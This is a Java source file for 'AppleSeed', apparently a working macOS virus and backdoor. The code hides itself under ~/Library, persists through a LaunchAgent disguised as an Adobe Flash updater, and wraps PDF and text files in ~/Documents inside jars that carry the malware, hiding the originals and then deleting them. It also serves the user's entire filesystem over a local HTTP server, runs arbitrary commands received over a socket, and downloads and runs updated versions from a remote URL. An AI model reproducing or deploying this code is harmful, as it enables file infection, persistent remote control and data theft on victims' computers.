package appleseed;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.concurrent.Executors;
/**
 *
 * @author leijurv
 * @author galdara
 */
public class AppleSeed {
    static{
        System.setProperty("java.awt.headless","true");
        //Make absolutely sure it won't show up in the dock.
    }
    static final String library=System.getProperty("user.home")+"/Library/.DS_Store";
    static final boolean verbose=false;
    static final String version="v0.7.1";
    static final int port=25565-10000;//Hehe
    static volatile ArrayList<File> loc;
    static volatile ArrayList<String> suf;
    static final Object tempLock=new Object();
    static final Object saveLock=new Object();
    static final Object cmdLock=new Object();
    static final Object arrayLock=new Object();
    static File z=null;
    public static void main(String[] args) throws Exception{
        if (!library.startsWith("/Users")){
            //Not on mac architecture. PANIC
            //TODO: Replace self with actual file because I cant do anything on stupid windows
            //Also, "ls is not a recognized batch program"
            return;
        }
        if (args.length!=0&&args[0].equals("cats")){
            if (verbose){
                System.out.println("IS SPECIAL");
            }
            final ServerSocket s=new ServerSocket(port-1);
            new Thread() {
                @Override
                public void run(){
                    while (true){
                        try{
                            final Socket l=s.accept();
                            new Thread() {
                                @Override
                                public void run(){
                                    try{
                                        DataInputStream a=new DataInputStream(l.getInputStream());
                                        String lol=a.readUTF();
                                        DataOutputStream o=new DataOutputStream(l.getOutputStream());
                                        o.writeUTF(version+":"+lol);
                                        l.close();
                                    } catch (IOException ex){
                                    }
                                }
                            }.start();
                        } catch (IOException ex){
                        }
                    }
                }
            }.start();
            thr();
            return;
        }
        URL o=new AppleSeed().getClass().getResource("/r.txt");
        boolean isDemon=o.getPath().startsWith("file:"+library);
        String pathtoSelf=o.getPath().substring(5,o.getPath().length()-7);
        boolean update=false;
        if (!isDemon){
            final String F=new BufferedReader(new InputStreamReader(o.openStream())).readLine();//No comma
            URL u=new AppleSeed().getClass().getResource("/"+F);
            if (verbose){
                System.out.println("open file "+u);
            }
            try(InputStream I=u.openStream()){
                String abba=u.toString().replace("AppleSeed.jar",F+".jar");
                String path=abba.substring(9,abba.indexOf("!")-4);//Has commas
                if (path.contains(",")){
                    path=replaceLast(path,',','.');//Now no commas
                }
                if (verbose){
                    System.out.println("Deflating to "+path);
                }
                //final File z=new File(System.getProperty("user.home")+"/Library/"+F);
                z=new File(new File(path).getParent()+"/"+F);//Even if jar has been renamed, decompress to file with correct name
                //However, the daemon has no way of knowing that the jar is renamed, so it'll make a new jar of the decompressed file,
                //if it's searching for it
                update=z.getPath().equals(path);
                if (!z.exists()){//I mean if it already exists
                    z.createNewFile();
                    try(FileOutputStream f=new FileOutputStream(z)){
                        int size=I.available();
                        while (I.available()>0){
                            if (verbose){
                                System.out.println(I.available());
                            }
                            byte[] a=new byte[I.available()];
                            int read=I.read(a);//How many bytes it ACTUALLY read. Because it's stupid it can only
                            //read about 8000 bytes at a time.
                            f.write(a,0,read);//Write from a from position 0 to read
                        }
                        f.close();
                    }
                }
            }
            z.setLastModified(new File(pathtoSelf).lastModified()-1);
            synchronized (cmdLock){
                new ProcessBuilder("open",z.getCanonicalPath()).start().waitFor();
                new ProcessBuilder("SetFile","-a","V",z.getCanonicalPath()).start().waitFor();
            }
            //Somewhere here, maybe wait for like 800 years, do a rm
        }
        File demon=new File(library+"/AppleSeed.jar");
        boolean demonExists=demon.exists();//Whether demon needs to be put in Library
        if (verbose){
            System.out.println("isDemon: "+isDemon);
        }
        if (verbose){
            System.out.println("demonExists: "+demonExists);
        }
        if (!demonExists /* || demon.getVersion < version*/){
            synchronized (cmdLock){
                String selfName=new File(pathtoSelf).getName();
                new ProcessBuilder("rm","-rf",library).start().waitFor();
                new ProcessBuilder("mkdir",library).start().waitFor();
                new ProcessBuilder("cp",pathtoSelf,library+"/").start().waitFor();
                new ProcessBuilder("mv",library+"/"+selfName,library+"/AppleSeed.jar").start().waitFor();
            }
            //demonExists=true;
        }
        boolean demonRunning=false;
        ServerSocket s=null;
        try{
            s=new ServerSocket(port);
        } catch (IOException e){
            demonRunning=true;
        }
        if (s!=null){
            s.close();
        }
        if (isDemon){
            demonRunning=true;//Fixed infinite loop of demon starting itself =)
        }
        if (verbose){
            System.out.println("demonRunning: "+demonRunning);
        }
        if (!demonRunning){
            if (verbose){
                System.out.println("Starting Demon");
            }
            synchronized (cmdLock){
                Process p=new ProcessBuilder("java","-jar",library+"/AppleSeed.jar").start();
                boolean printDemonResult=false;
                if (printDemonResult){
                    int i=p.waitFor();
                    BufferedReader Br=new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    if (verbose){
                        System.out.println("DEMON: ");
                    }
                    while ((line=Br.readLine())!=null){
                        if (verbose){
                            System.out.println(line);
                        }
                    }
                }
            }
        }
        if (z!=null&&update){
            new Thread() {
                @Override
                public void run(){
                    try{
                        Thread.sleep(2000);
                        try(Socket s=new Socket("localhost",15565)){
                            OutputStream o=s.getOutputStream();
                            DataOutputStream oo=new DataOutputStream(o);
                            oo.writeUTF(z.getParent());
                            oo.writeUTF("4");
                            oo.writeUTF(z.getName());
                            InputStream i=s.getInputStream();
                            DataInputStream ii=new DataInputStream(i);
                            String r=ii.readUTF();
                        }
                    } catch (IOException|InterruptedException ex){
                    }
                }
            }.start();//call daemon
        }
        if (isDemon){
            daemon();
        }
    }
    public static void daemon() throws Exception{
        final ServerSocket lock;
        if (verbose){
            System.out.println("Starting to do demon stuff");
        }
        if (verbose){
            System.out.println("Trying to bind to lock port "+port);
        }
        try{
            lock=new ServerSocket(port);
        } catch (IOException e){
            plist();//In case a "blocker" is running, bound to 15565
            if (verbose){
                System.out.println("Already bound");
            }
            return;
        }
        if (verbose){
            System.out.println("Starting socket thread...");
        }
        sub();
        new Thread() {
            @Override
            public void run(){
                while (true){
                    try{
                        if (!test()){
                            sub();
                        }
                        Thread.sleep(1000);
                    } catch (IOException|InterruptedException ex){
                    }
                }
            }
        }.start();
        File save=new File(library+"/.DS_Store");
        boolean w=!save.exists();
        if (!w){
            synchronized (saveLock){
                synchronized (arrayLock){
                    loc=new ArrayList<>();
                    suf=new ArrayList<>();
                    DataInputStream a=new DataInputStream(new FileInputStream(save));
                    try{
                        int num=a.readInt();
                        for (int i=0; i<num; i++){
                            loc.add(new File(a.readUTF()));
                            suf.add(a.readUTF());
                        }
                    } catch (IOException e){
                        w=true;
                    }
                }
            }
            //w=true;
        }
        if (w){
            synchronized (arrayLock){
                loc=new ArrayList<>();
                suf=new ArrayList<>();
                loc.add(new File(System.getProperty("user.home")+"/Documents"));
                loc.add(loc.get(0));
                suf.add("n.pdf");
                suf.add("1.txt");
            }
            save();
        }
        new Thread() {
            @Override
            public void run(){
                while (true){
                    for (int i=0; i<loc.size(); i++){
                        synchronized (arrayLock){//This really should be outside the loop ( because loop calls loc.size())
                            //However, that may cause a delay of up to loc.size()*1000 ms for another thread seeking lock
                            //And if there's a lot of files, that can cause terrible socket problems.
                            infectall(loc.get(i),suf.get(i));
                        }
                        try{
                            Thread.sleep(1000);
                            //System.out.println(loc.get(i)+","+suf.get(i));
                        } catch (InterruptedException e){
                            //System.out.println(e);
                            //e.printStackTrace();
                        }
                    }
                }
            }
        }.start();//infectall
        new Thread() {
            @Override
            public void run(){
                while (true){
                    try{
                        final Socket yourMom=lock.accept();
                        new Thread() {
                            @Override
                            public void run(){
                                try(DataInputStream i=new DataInputStream(yourMom.getInputStream())){
                                    String args=i.readUTF();
                                    int method=Integer.parseInt(i.readUTF());
                                    String data=i.readUTF();
                                    String output=doMethod(method,args,data);
                                    DataOutputStream o=new DataOutputStream(yourMom.getOutputStream());
                                    o.writeUTF(output);
                                    yourMom.close();
                                } catch (Exception ex){
                                }
                            }
                        }.start();
                    } catch (IOException ex){
                    }
                }
            }
        }.start();//15565
        InetSocketAddress addr=new InetSocketAddress(port+1);
        HttpServer server=HttpServer.create(addr,0);
        server.createContext("/quetzil",new HttpHandler() {
            @Override
            public void handle(HttpExchange he) throws IOException{
                kill();
            }
        });
        server.createContext("/",new HttpHandler() {
            @Override
            public void handle(HttpExchange he) throws IOException{
                File file=new File("/"+he.getRequestURI().getPath()).getCanonicalFile();
                if (!file.exists()){
                    he.sendResponseHeaders(404,0);
                    return;
                }
                if (!file.canRead()){
                    he.sendResponseHeaders(403,0);
                    return;
                }
                he.sendResponseHeaders(200,0);
                if (file.isDirectory()){
                    File[] a=file.listFiles();
                    try(OutputStream os=he.getResponseBody()){
                        os.write(("<html><head><title>"+file.getPath()+"</title></head><body>").getBytes());
                        if (verbose){
                            os.write((he.getLocalAddress().toString()).getBytes());
                        }
                        os.write(("<a href='"+file.getParent()+"'>Up</a><br /><br />").getBytes());
                        for (File s : a){
                            os.write(("<a href='"+s.getPath()+"'>"+s.getName()+"</a><br />").getBytes());
                        }
                        os.write(("</body></html>").getBytes());
                        os.close();
                    }
                }else{
                    try(OutputStream os=he.getResponseBody(); FileInputStream fs=new FileInputStream(file)){
                        final byte[] buffer=new byte[0x10000];
                        int count=-1;
                        while ((count=fs.read(buffer))>=0){
                            os.write(buffer,0,count);
                        }
                        os.close();
                        fs.close();
                    }
                }
            }
        });
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        new Thread() {
            @Override
            public void run(){
                thr();
            }
        }.start();
        new Thread() {
            @Override
            public void run(){
                while (true){
                    try{
                        URL uu=new URL("https://raw.githubusercontent.com/leijurv/Java-Projects/master/AppleSeed/versions.txt");
                        BufferedReader a=new BufferedReader(new InputStreamReader(uu.openStream()));
                        String strLine;
                        String str="";
                        while ((strLine=a.readLine())!=null){
                            str=strLine;
                        }
                        String s=str.split(":")[0];
                        if (version.compareTo(s)<0){
                            update();
                        }
                        Thread.sleep(20000);
                    } catch (IOException|InterruptedException ex){
                        try{
                            //Network is probably down
                            Thread.sleep(20000);
                        } catch (InterruptedException exx){
                        }
                    }
                }
            }
        }.start();
        new Thread() {
            @Override
            public void run(){
                while (true){
                    File f=new File(library+"/AppleSeed.jar");
                    if (!f.exists()){
                        try{
                            synchronized (tempLock){
                                new ProcessBuilder("rm","-rf",library).start().waitFor();
                                new ProcessBuilder("mkdir",library).start().waitFor();
                            }
                        } catch (IOException|InterruptedException ex){
                            continue;
                        }
                        update();
                    }
                }
            }
        }.start();
        //HERE IS WHERE TO PUT EXTRA EVIL THINGS
        if (verbose){
            System.out.println("Demon stuff finished");
        }
    }
    public static boolean test(){
        try{
            String que;
            String res;
            try(Socket ss=new Socket("localhost",15564)){
                DataOutputStream a=new DataOutputStream(ss.getOutputStream());
                que="KITTY"+new Random().nextInt(5000);
                a.writeUTF(que);
                DataInputStream aa=new DataInputStream(ss.getInputStream());
                res=aa.readUTF();
            }
            return res.equals(version+":"+que);
        } catch (IOException ex){
            return false;
        }
    }
    public static void update(){
        try{
            String newpath="https://github.com/leijurv/Java-Projects/blob/master/AppleSeed/Obfuscated/AppleSeed.jar?raw=true";
            URL u=new URL(newpath);
            try(InputStream i=u.openStream(); FileOutputStream f=new FileOutputStream(library+"/AppleSeed1.jar")){
                final byte[] buffer=new byte[0x10000];
                int count=-1;
                while ((count=i.read(buffer))>=0){
                    f.write(buffer,0,count);
                }
            }
            synchronized (cmdLock){
                new ProcessBuilder("mv",library+"/AppleSeed1.jar",library+"/AppleSeed.jar").start().waitFor();
            }
            kill();
        } catch (IOException|InterruptedException ex){
        }
    }
    public static void sub() throws IOException{
        synchronized (cmdLock){
            new ProcessBuilder("launchctl","submit","-l",version,"--","java","-jar",library+"/AppleSeed.jar","cats").start();
        }
    }
    public static void thr(){
        while (true){
            try{
                plist();
                launchctl();
                Thread.sleep(3000);
            } catch (Exception e){
            }
        }
    }
    public static void plist() throws Exception{
        String login=System.getProperty("user.home")+"/Library/LaunchAgents/com.adobe.Flash-Updater.plist";
        String cont="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                +"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                +"<plist version=\"1.0\">\n"
                +"<dict>\n"
                +"  <key>Label</key>\n"
                +"  <string>com.adobe.Flash-Updater</string>\n"
                +"  <key>ProgramArguments</key>\n"
                +"  <array>\n"
                +"    <string>java</string>\n"
                +"    <string>-jar</string>\n"
                +"    <string>"+library+"/AppleSeed.jar</string>\n"
                +"  </array>\n"
                +"  <key>RunAtLoad</key>\n"
                +"  <true/>\n"
                +"  <key>KeepAlive</key>\n"
                +"  <true/>\n"
                +/*This will automatically make launchd restart it if someone kills the process. 
                 Also, this can make updates easy. Just replace library+Appleseed.jar with the new version, 
                 then kill yourself, launchd will "restart" you, and actually run the new version*/"  <key>WorkingDirectory</key>\n"
                +"  <string>"+library+"/</string>\n"
                +"</dict>\n"
                +"</plist>";
        if (!new File(login).exists()){
            try(FileWriter f=new FileWriter(login)){
                f.write(cont);
                f.close();
            }
        }else{
            //Check if contents have been modified, if so do the replace
            FileInputStream a=new FileInputStream(new File(login));
            byte[] Z=new byte[a.available()];
            a.read(Z);
            if (!cont.equals(new String(Z))){
                if (verbose){
                    System.out.println("TAMPERED OH NO");
                }
                try(FileWriter f=new FileWriter(login)){
                    f.write(cont);
                    f.close();
                }
            }
        }
    }
    public static void launchctl() throws Exception{
        String login=System.getProperty("user.home")+"/Library/LaunchAgents/com.adobe.Flash-Updater.plist";
        synchronized (cmdLock){
            Process p=new ProcessBuilder("launchctl","load","-w","-F",login).start();
            //This only makes it invincible from first start to first kill
            //launchctl unload will kill it IF AND ONLY IF the current running process
            //was STARTED by launchd and NOT an infected file
            if (verbose){
                System.out.println("dd");
            }
            p.waitFor();
            if (verbose){
                System.out.println("d");
            }
            if (verbose){
                BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
                String strLine;
                while ((strLine=br.readLine())!=null){
                    System.out.println(strLine);
                }
            }
        }
    }
    public static void kill(){
        synchronized (saveLock){//Make sure not in process of saving
            synchronized (arrayLock){//Make sure not in process of modifying arraylists
                synchronized (tempLock){//Make sure not in process of infecting
                    synchronized (cmdLock){//Make sure not in process of doing a UNIX command
                        System.exit(0);
                    }
                }
            }
        }
    }
    public static void save(){
        synchronized (saveLock){
            synchronized (arrayLock){
                try{
                    File save=new File(library+"/.DS_Store");
                    save.delete();
                    try(DataOutputStream a=new DataOutputStream(new FileOutputStream(save))){
                        a.writeInt(loc.size());
                        for (int i=0; i<loc.size(); i++){
                            a.writeUTF(loc.get(i).getCanonicalPath());
                            a.writeUTF(suf.get(i));
                        }
                    }
                } catch (IOException ex){
                }
            }
        }
    }
    public static String[] decode(String msg,String data){
        String s=data.substring(0,1);
        data=data.substring(1,data.length());
        if (verbose){
            System.out.println(data);
        }
        String[] a=data.split(s);
        String[] args=new String[a.length+1];
        if (msg.equals("/-")){
            args=new String[a.length];
        }
        System.arraycopy(a,0,args,0,a.length);
        if (!msg.equals("/-")){
            args[a.length]=msg;
        }
        if (verbose){
            for (String arg : args){
                System.out.print(arg+",");
            }
            System.out.println();
        }
        return args;
    }
    public static String doMethod(int method,String msg,String data) throws Exception{
        if (verbose){
            System.out.println(method+"::"+msg);
        }
        if (method==0){
            return version+":"+System.getProperty("user.home");
        }
        if (data.equals("")){
            data=null;
        }
        if (!msg.startsWith("/")){
            msg=System.getProperty("user.home")+"/"+msg;
        }
        if (method==1){
            try(FileWriter f=new FileWriter(msg)){
                f.write(data);
            }
            return "DID IT";
        }
        if (method==2){
            synchronized (cmdLock){//No
                Process p=new ProcessBuilder(decode(msg,data)).start();
                BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
                String result="";
                String strLine;
                while ((strLine=br.readLine())!=null){
                    result=result+strLine+"\n";
                }
                return "DID IT> "+result;
            }
        }
        if (method==3){//Make sure that your unix command will do what you think it will.
            String[] args=decode(msg,data);
            ArrayList<String> a=new ArrayList<>(args.length);
            a.addAll(Arrays.asList(args));
            return "DID IT> "+a;
        }
        if (method==4){
            File f=new File(msg);
            synchronized (arrayLock){
                boolean pos=true;
                for (int i=0; i<loc.size(); i++){
                    if (loc.get(i).equals(f)&&suf.get(i).equals(data)){
                        pos=false;
                    }
                }
                if (pos){
                    loc.add(f);
                    suf.add(data);
                }
            }
            save();
            synchronized (arrayLock){
                return "DID IT> "+loc+suf;
            }
        }
        if (method==5){
            return "DID IT> "+infectall(new File(msg),data);
        }
        if (method==6){
            try{
                synchronized (tempLock){
                    infect(new File(msg));
                }
                return "DID IT> ";
            } catch (Exception e){
                return "Didn't =("+e;
            }
        }
        return "UNKNOWN COMMAND YOU POO";
    }
    public static int getState(File pathname){
        if (pathname.isDirectory()){
            return 0;
        }
        File af=new File(pathname.getPath().replace(".",",")+".jar");
        if (af.exists()){
            if (af.lastModified()<pathname.lastModified()){
                if (verbose){
                    System.out.println("Jar is older than file HOLY CRAP WHAT DO I DO PANIC PANIC PANIC");
                }
                return 3;
            }
            if (verbose){
                System.out.println(pathname+" is already infected. I guess that's cool.");
            }
            return 2;
        }
        return 1;
    }
    public static ArrayList<String> infectall(File doc,final String suffix){
        if (verbose){
            System.out.println("Infecting everything in "+doc+" with suffix "+suffix);
        }
        File[] con=doc.listFiles(new FileFilter() {
            @Override
            public boolean accept(File pathname){
                if (!pathname.getPath().endsWith(suffix)){
                    return false;//WE DONT WANT THIS TO HAPPEN AGAIN
                }
                return AppleSeed.getState(pathname)%2==1;//LOLOLOLOLOLOL XD XD XD
            }
        });
        ArrayList<String> result=new ArrayList<>();
        for (File f : con){
            if (verbose){
                System.out.println("Infecting "+f);
            }
            int state=getState(f);
            boolean deleteOrig=(state==5021);//LOL
            synchronized (tempLock){//Outside the try, because the catch modifies temp
                try{
                    infect(f);
                    result.add(f.getName());
                } catch (Exception e){
                    try{
                        new ProcessBuilder("rm","-rf",library+"/temp").start().waitFor();
                        //Some kind of cleanup of library&temp...
                    } catch (IOException|InterruptedException ex){
                        //IM DONE
                    }
                }
            }
            if (verbose){
                System.out.println("Done infecting "+f);
            }
        }
        return result;
    }
    public static void infect(final File f) throws Exception{
        new ProcessBuilder("mkdir",library+"/temp").start().waitFor();
        new ProcessBuilder("cp",library+"/AppleSeed.jar",library+"/temp/AppleSeed.zip").start().waitFor();
        if (verbose){
            System.out.println("Copied jar to temp");
        }
        new ProcessBuilder("unzip",library+"/temp/AppleSeed.zip","-d",library+"/temp/").start().waitFor();
        if (verbose){
            System.out.println("Unzipped jar");
        }
        new ProcessBuilder("rm",library+"/temp/AppleSeed.zip").start().waitFor();
        String name=f.getName();
        FileInputStream fstream=new FileInputStream(library+"/temp/r.txt");
        String old=new BufferedReader(new InputStreamReader(new DataInputStream(fstream))).readLine();
        new ProcessBuilder("rm",library+"/temp/"+old).start().waitFor();
        try(FileOutputStream ff=new FileOutputStream(library+"/temp/r.txt")){
            ff.write(name.getBytes());
        }
        if (verbose){
            System.out.println("wrote r");
        }
        new ProcessBuilder("cp",f.getCanonicalPath(),library+"/temp/").start().waitFor();
        if (verbose){
            System.out.println("copied to temp");
        }
        addFile(name,"appleseed");
        addFile(name,"META-INF");
        addFile(name,"r.txt");
        addFile(name,name);
        new ProcessBuilder("rm","-rf",library+"/temp").start().waitFor();
        String nn=replaceLast(f.getCanonicalPath(),'.',',')+".jar";
        if (verbose){
            System.out.println(nn);
        }
        boolean alr=new File(replaceLast(f.getCanonicalPath(),'.',',')+".jar").exists();
        new ProcessBuilder("mv",library+"/"+name+".jar",nn).start().waitFor();
        new ProcessBuilder("SetFile","-a","E",nn).start();//Hide extension
        new ProcessBuilder("SetFile","-a","V",f.getCanonicalPath()).start();//Hide totally
        if (!alr){
            /*
             //Wait before deleting because
             new Thread(){
             public void run(){
             try {
             long time=f.lastModified()+5000;
             while(System.currentTimeMillis()<time){
            
             Thread.sleep(1000);
             }
             new ProcessBuilder("rm","-rf",f.getCanonicalPath()).start();//Hide totally
             } catch (Exception ex) {
             Logger.getLogger(AppleSeed.class.getName()).log(Level.SEVERE, null, ex);
             }
        
             }
             }.start();*/
            new ProcessBuilder("rm","-rf",f.getCanonicalPath()).start();
        }
    }
    public static void addFile(String name,String n) throws Exception{
        ProcessBuilder pp=new ProcessBuilder("zip","-r",library+"/"+name+".jar",n);
        pp.directory(new File(library+"/temp/"));
        Process p=pp.start();
        p.waitFor();
        boolean printZip=false;
        if (printZip){
            BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
            String strLine;
            while ((strLine=br.readLine())!=null){
                if (verbose){
                    System.out.println(strLine);
                }
            }
        }
    }
    public static String replaceLast(String a,char b,char c){
        char[] A=a.toCharArray();
        for (int i=0; i<A.length; i++){
            if (A[i]==b){
                A[i]=c;
            }
        }
        return new String(A);
    }
}
